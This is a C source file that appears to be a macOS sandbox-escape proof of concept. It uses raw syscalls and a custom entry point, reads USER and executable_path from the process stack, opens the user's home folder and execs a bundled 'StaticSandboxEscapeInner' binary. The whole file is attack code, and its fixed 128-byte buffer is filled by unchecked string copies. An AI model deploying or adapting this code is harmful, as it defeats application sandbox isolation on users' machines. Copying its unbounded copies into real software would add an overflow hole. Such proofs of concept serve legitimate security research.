#include <stddef.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/syslimits.h>

/* Probably wrong but they work well enough for this */

size_t _strlen(char *s) {
	size_t len = 0;
	while (s[len++])
		;
	return --len;
}

int _strncmp(char *s1, char *s2, size_t n) {
	while (--n && *s1 && *s1++ == *s2++)
		;
	return *--s1 - *--s2;
}

char *_strcpy(char *s1, char *s2) {
	char *s = s1;
	while ((*s1++ = *s2++))
		;
	return s;
}

char *_strstr(char *h, char *n) {
	size_t len = _strlen(n);
	while (*h) {
		if (!_strncmp(h, n, len)) {
			return h;
		}
		++h;
	}
	return NULL;
}

#define UNIX_SYSCALL 2 << 24

int _open(char *path, int flag) {
	int result;
	__asm__ volatile(
	    ".intel_syntax noprefix\n\t"
	    "syscall"
	    : "=a"(result)
	    : "a"(SYS_open | UNIX_SYSCALL), "D"(path), "S"(flag)
	    : "rcx", "r11");
	return result;
}

int _execve(char *path, char **argv, char **envp) {
	int result;
	__asm__ volatile(
	    ".intel_syntax noprefix\n\t"
	    "syscall"
	    : "=a"(result)
	    : "a"(SYS_execve | UNIX_SYSCALL), "D"(path), "S"(argv), "d"(envp)
	    : "rcx", "r11");
	return result;
}

__asm__(
    ".intel_syntax noprefix\n"
    ".globl start\n"
    "start:\n\t"
    "mov rdi, rsp\n\t"
    "call __main");

#define USER "USER="
#define EXECUTABLE_PATH "executable_path="

void _main(char **stack) {
	char home[128];
	++stack;         // argc;
	while (*stack++) // argv
		;
	while (*stack) {
		if (!_strncmp(*stack, USER, _strlen(USER))) {
			_strcpy(home, "/Users/");
			_strcpy(home + _strlen(home), *stack + _strlen(USER));
		}
		++stack;
	}
	++stack; // NULL between argv and apple
	char executable[PATH_MAX];
	while (*stack) {
		if (!_strncmp(*stack, EXECUTABLE_PATH, _strlen(EXECUTABLE_PATH))) {
			_strcpy(executable, *stack + _strlen(EXECUTABLE_PATH));
			_strcpy(_strstr(executable, ".app"), ".app/Contents/SharedSupport/StaticSandboxEscapeInner.app/Contents/MacOS/StaticSandboxEscapeInner");
		}
		++stack;
	}
	_open(home, 0);
	_execve(executable, NULL, NULL);
	while (1)
		;
}
